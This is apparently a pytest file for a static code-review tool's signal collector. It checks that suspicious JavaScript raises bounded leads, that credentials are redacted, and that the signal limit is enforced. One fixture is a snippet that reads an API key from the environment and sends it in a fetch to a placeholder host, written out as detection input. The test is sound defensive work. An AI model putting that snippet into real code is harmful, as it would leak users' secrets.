from __future__ import annotations

import asyncio

import pytest
from review_helpers import context

from beforerun.features.contracts import RevisionSide
from beforerun.features.signals import collect_signals


def prepared(raw: bytes):
    snapshot, ledger, _ = context({"scripts/entry.cjs": raw})
    file_id = snapshot.file_id(RevisionSide.TARGET, "scripts/entry.cjs")
    asyncio.run(snapshot.admit_file(file_id))
    evidence = ledger.issue(file_id)
    return snapshot, ledger, file_id, evidence


def test_signals_are_bounded_prioritization_leads_with_benign_alternatives() -> None:
    snapshot, ledger, file_id, evidence = prepared(
        b"const token = process.env.API_KEY;\nfetch('https://example.invalid', {body: token});\n"
    )
    leads = collect_signals(snapshot, ledger, {file_id: evidence.evidence_id})
    assert [lead.rule_id for lead in leads] == [
        "credential_or_environment_access",
        "network_request",
    ]
    environment, network = leads
    # Credential redaction prevents attaching the original match as an exact excerpt citation.
    assert environment.evidence_id is None and environment.pointer
    assert environment.pointer.file_id == file_id
    assert network.evidence_id == evidence.evidence_id and network.pointer is None
    assert all(
        "benign" in lead.reason.lower() or "intentional" in lead.reason.lower() for lead in leads
    )
    assert all(not hasattr(lead, "assessment") for lead in leads)
    assert collect_signals(snapshot, ledger, {file_id: evidence.evidence_id}, max_signals=1) == (
        leads[0],
    )


def test_match_outside_issued_excerpt_is_a_non_citation_pointer() -> None:
    snapshot, ledger, file_id, evidence = prepared(
        b"// inert bounded filler\n" * 179 + b"fetch('https://example.invalid');\n"
    )
    assert "fetch(" not in evidence.representation
    leads = collect_signals(snapshot, ledger, {file_id: evidence.evidence_id})
    assert len(leads) == 1
    assert leads[0].evidence_id is None
    assert leads[0].pointer and leads[0].pointer.file_id == file_id
    assert "Static lead only" in leads[0].pointer.note


def test_no_match_and_invalid_signal_limit_have_no_behavioral_claim() -> None:
    snapshot, ledger, file_id, evidence = prepared(b"console.log('inert compatibility only');\n")
    assert collect_signals(snapshot, ledger, {file_id: evidence.evidence_id}) == ()
    with pytest.raises(ValueError):
        collect_signals(snapshot, ledger, {file_id: evidence.evidence_id}, max_signals=0)
    with pytest.raises(ValueError):
        collect_signals(snapshot, ledger, {file_id: evidence.evidence_id}, max_signals=257)
